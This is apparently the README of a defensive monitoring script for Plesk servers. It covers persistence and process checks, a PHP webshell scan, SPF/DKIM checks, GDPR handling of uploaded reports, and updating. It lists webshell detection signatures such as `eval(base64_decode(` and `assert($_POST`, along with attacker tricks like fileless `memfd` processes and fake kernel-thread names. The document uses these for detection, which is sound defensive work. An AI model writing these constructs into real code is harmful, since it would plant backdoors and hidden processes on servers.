  - *Processes* are checked live in every run, without a baseline: a program in `/tmp`, `/var/tmp`, `/dev/shm` or under `/var/www`, a program deleted after it was started (unless an update replaced it – then only a restart is pending), a program that exists only in memory (`memfd`, not for root), and a process whose name looks like a kernel thread (`[kworker/0:1]`) but that has a program file. The alert repeats in every run while the process runs; a monitoring or security agent that uses such tricks on purpose can be excluded with `PERSISTENCE_IGNORE`. In containers without access to `/proc/<pid>/exe` this part is skipped, with a line in the report.
  - *Passwords in cron lines* (`mysqldump -pSecret`, `https://user:pw@…`, `password=…`) are masked in the report and in the baseline.
  - *Not covered:* keys in an `AuthorizedKeysFile` other than `~/.ssh/authorized_keys`, UDP ports, `at` jobs, and anything an attacker with root rights hides on purpose (a rootkit can hide processes and files from every tool on the system – the checks catch the common, automated attacks on web servers, not a targeted one).
- **Webshell scan:** only PHP files changed since the previous scan are checked, so a full plugin update can produce a burst of findings. Legitimate plugins rarely use these constructs (`eval(base64_decode(`, `assert($_POST`, calling functions from request parameters, `preg_replace` with `/e`). Check each finding and exclude known-good files with `WEBSHELL_IGNORE`.
- **Mail certificate name:** if your customers enter something other than the server's host name in their mail clients (e.g. `mail.example.com`), set `MAIL_TLS_NAME` to that name. A name mismatch shows up in clients as a certificate warning, and many users click it away.
- **Domain DNS:** "website points elsewhere" is informational: a domain moved to another host, or sits behind a CDN such as Cloudflare. The CAA check only runs for domains whose current certificate comes from Let's Encrypt. Domain blocklists (Spamhaus DBL, SURBL) refuse queries from large public resolvers, just like the IP blocklists, so they are queried through the local resolver.
- **Public resolver for the SPF/DKIM check:** on Plesk servers the system resolver often gives wrong answers for this check. systemd-resolved (`127.0.0.53`) returns no MX/TXT records for the server's own hostname, and a local Plesk BIND may answer from zones that exist in Plesk while the domain's real DNS is hosted elsewhere. The check therefore asks `1.1.1.1` by default (`MAILAUTH_RESOLVER`). If outbound DNS is blocked, set another resolver or `""`.
- **SPF/DKIM check** covers every domain with a Plesk mail directory or DKIM key. An **alert** is raised only when the domain's MX points to this server (its users send through this server) **and neither SPF nor DKIM passes**. In that case DMARC fails and mails are likely rejected or marked as spam. If only one of them fails, DMARC still passes, so the domain is listed as a recommendation without an alert. Domains whose mail is hosted elsewhere are listed for information only. **Plesk domain aliases with the mail service switched off** are listed for information only as well (`alias of …, mail off`): nobody can send or receive mail with them on this server, so a missing or failing SPF/DKIM doesn't matter. An SPF record ending in `+all` is still reported, because it lets anyone forge mail from the domain. Aliases with mail switched on are checked like any other domain, since all mailboxes of the primary domain can send under the alias address. SPF evaluation is simplified: `ip4`, `a`, `mx`, `include` and `redirect` are followed (up to 10 levels), `ptr`/`exists`/macros and IPv6 are not. A `fail` therefore means "this server's IPv4 is not covered"; verify with an online SPF checker before contacting the domain owner. DKIM is compared byte for byte: `MISMATCH` usually means the key was regenerated in Plesk but the DNS record (often at an external DNS provider) was not updated.
- **DB-IP Lite** data is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). The attribution line at the end of every report satisfies this. Country accuracy is high, city data is not used.
- **Safety limits:** the script runs with low CPU and disk priority (`nice`, `ionice`). Every external command that can hang has a time limit (`CMD_TIMEOUT`, `FIND_TIMEOUT`), cron runs as a whole are stopped after `MAX_RUNTIME`, and at most `MAX_LOG_MB` of each log are read per run. Temporary files are kept under `/var/lib/plesk-server-report` instead of `/tmp`, which is in RAM on Debian 13. Nothing fails silently: an aborted run (error, timeout, kill) is reported by the next run with the step it was in, a run that is still hanging after `MAX_RUNTIME` makes the next runs upload a warning report instead of skipping quietly, and missing data sources (mail log, web logs, panel log, Roundcube logs, empty paths in the configuration) appear as ` i ` notes below the STATUS line – as does an IMAP/POP3 server whose log lines are present but whose login format is not recognized (supported: Dovecot and Courier), so its figures are not mistaken for "no failed logins". Details of aborted runs: `journalctl -t plesk-server-report`. Interactive runs from a terminal are not time-limited, so Ctrl-C works.
- The CPU section is a 3-second snapshot, not an average.
- Report timestamps use the server's time zone (`timedatectl` shows it).

---

## Security

- Runs as root because it needs to read all logs (and `/proc`, crontabs, `authorized_keys` for the persistence check). It changes nothing on the server – no IP is blocked, no process stopped, no file removed; findings are reported, the action is yours. It writes only to `/var/lib/plesk-server-report` (mode 700), to the configured rclone remote and – with `REPORT_MAIL_TO` – hands mails to the local `sendmail`.
- External connections: DNS lookups (blocklists, SPF/DKIM, domain DNS), the rclone upload, the report mails (only if `REPORT_MAIL_TO` is at another provider), the daily HTTPS check of your own domains (to this server's IP), the monthly download of the DB-IP Lite database (only with geolocation), and once a day one request to the GitHub API for the latest release of the script (`UPDATE_CHECK=0` switches it off). Nothing about your server is sent; the script never updates itself.
- The rclone config (`/root/.config/rclone/rclone.conf`) contains the token for the storage account. That is another reason to use a dedicated account with the narrowest possible scope (`drive.file`, bucket-limited keys, chrooted SFTP user).

---

## Privacy (GDPR)

The reports and the [state directory](STATE-FILES.md) contain personal data: IP addresses, mailbox addresses, login times, and the country and network operator of an IP. They concern your customers' users, website visitors and attackers. Processing logs to protect a server is usually covered by legitimate interest (Art. 6(1)(f) GDPR; recital 49 names network and information security), but what applies to you depends on your setup. This is not legal advice.

What the script does to keep it small:
- **GeoIP runs locally** (DB-IP Lite database) – no IP is sent anywhere for it.
- **Limited retention:** reports `RETENTION_DAYS` / `LOCAL_KEEP_DAYS` (7 days), client IPs of mail logins `KNOWN_MAIL_IP_DAYS` (30), foreign countries per mailbox `IMAP_COUNTRY_KEEP_DAYS` (30), SSH/Plesk login IPs `KNOWN_LOGIN_IP_DAYS` (90).
- It only reads logs the server writes anyway; it creates no new raw data.

**Which setup, from a GDPR point of view** – from best to weakest:

1. **Local only** (`REMOTE=""`, no `REPORT_MAIL_TO`) – no copy anywhere else, deleted after `LOCAL_KEEP_DAYS`. But nobody is told about a problem unless they log in and read the reports – and monitoring is a security measure in its own right (Art. 32 GDPR).
2. **Mail to a mailbox on this server, no upload** ([Reports by mail](#reports-by-mail)) – no third party either. Additional copies in the mailbox, in the server backups and on the devices that read it – delete old mails regularly. You have to notice yourself when the daily summary doesn't arrive. The best balance for most.
3. **Upload with `MASK_MAILBOXES=1`** – the storage and AI provider get pseudonymised mail addresses, but still IP addresses and domains. Data processing agreements are still needed (see below).
4. **Upload with full addresses** – the most convenient for an AI review, and the most personal data at third parties.

The AI review is the most useful option – and the weakest one for data protection. If you can't name the storage and AI provider in your agreements with your customers, stay with 1 or 2.

**If you upload the reports or let an AI read them**, the storage and the AI provider receive this data. If you host mail or websites for customers, they are typically sub-processors: name them in your data processing agreements with your customers and in your record of processing activities, and use providers that offer a data processing agreement (and, outside the EU, a valid transfer mechanism). **Pseudonymised mailboxes:** with `MASK_MAILBOXES=1` the uploaded reports show every mail address as a pseudonym such as `mbx-4f2a91@example.com`, while the local reports stay complete. The same mailbox always gets the same pseudonym, so the AI can still follow a mailbox across reports and days; the key to compute it stays on your server ([state files](STATE-FILES.md)). When a review names a pseudonym, translate it back on the server:

```bash
plesk-server-report.sh --decode mbx-4f2a91@example.com
plesk-server-report.sh --decode < review.txt     # a whole review, every pseudonym replaced
# an uploaded report, read straight from the upload target (REMOTE) – the local copies in
# /var/lib/plesk-server-report/out are not pseudonymised, they need no decoding
rclone cat reports:server-reports/HOSTNAME/summary.txt | plesk-server-report.sh --decode
rclone cat reports:server-reports/HOSTNAME/report-YYYYMMDD-HHMM.txt | plesk-server-report.sh --decode
```

To see what the AI would get before you switch it on – nothing is uploaded: `plesk-server-report.sh --pseudonymise /var/lib/plesk-server-report/out/summary.txt | less`

Limits: pseudonymised data is still personal data (GDPR Art. 4(5)) – it lowers the risk, the agreements above are still needed. The domain stays visible (needed to tell which customer is affected), and a one-person domain still points to that person. IP addresses are not masked, because the reports need them to tell a customer from an attacker. Bare user names without a domain (attackers often try `office` instead of `office@…`) stay as they are. If your AI prompt lists known exceptions by mailbox, use the pseudonyms there.

---

## Using another CMS? Help wanted

Everything except two checks works with any software: mail, blocklists, system, services, fail2ban, 5xx and PHP errors, certificates, backups and geolocation. The two checks below currently understand **WordPress only**, because that is what runs on the author's server:

- **login-attack analysis** (`wp-login.php` / `xmlrpc.php`, detection of successful logins by HTTP status code)
- **PHP files in upload folders** (`wp-content/uploads`)

Other applications popular on Plesk (Joomla, Drupal, TYPO3, PrestaShop, Shopware, Magento, Nextcloud, …) use different login URLs, status codes and upload folders. Guessing them would produce false alarms. Joomla answers a successful login with `303` instead of `302`, for example, and Nextcloud redirects on failed logins too.

**If you run one of them, you can help:** open an issue with the template [*Support for another CMS / application*](../../issues/new?template=cms-support.yml). It asks for exactly what is needed:

- software and version, Plesk version, OS
- the login URL of the admin area
- a few **anonymized** access-log lines of a successful login, a failed login and (if available) an attack
- the upload folders and any legitimate PHP files inside them

The template includes a one-line command that anonymizes the log lines (IPs → `203.0.113.x`, domain → `example.com`). **Please never post real IPs, domains or user names. Issues are public.**

---

## Updates

The script runs on a production Plesk server with about 40 domains and is **actively maintained**. Every morning the reports are reviewed (see [Reading the reports](#reading-the-reports)). When a review shows a blind spot, a false alarm or a recommendation the script could have handled itself, the script is updated. New findings about attacks, log formats or Plesk behaviour go in as well. Real-world examples so far:

- a distributed WordPress brute-force attack led to the *WordPress login attacks* section (distinct IPs, wp-login vs. xmlrpc, detection of successful logins after failures),
- a daily check that silently missed data under cron led to the fixed `PATH`,
- Postfix logging `sasl_username` on failed logins initially caused false "compromised mailbox" alarms, which has been fixed.

To update, download the script again (your settings in `/etc/plesk-server-report.conf` and the state in `/var/lib/plesk-server-report` are kept):

```bash
curl -fsSL -o /usr/local/sbin/plesk-server-report.sh \
  https://github.com/cmelius/plesk-monitoring-server-Report/releases/latest/download/plesk-server-report.sh
/usr/local/sbin/plesk-server-report.sh --version
```

(or the `main` URL from [Installation](#installation) to get changes before they are released)

Watch the repository (*Watch → Custom → Releases* or *All activity*) to get notified about changes. Issues and pull requests with your own findings are welcome.

### Changelog

What changed in each version: see [CHANGELOG.md](CHANGELOG.md).

---

## License

MIT. Use at your own risk. Contributions, parsers for other log formats and threshold experiences are welcome.
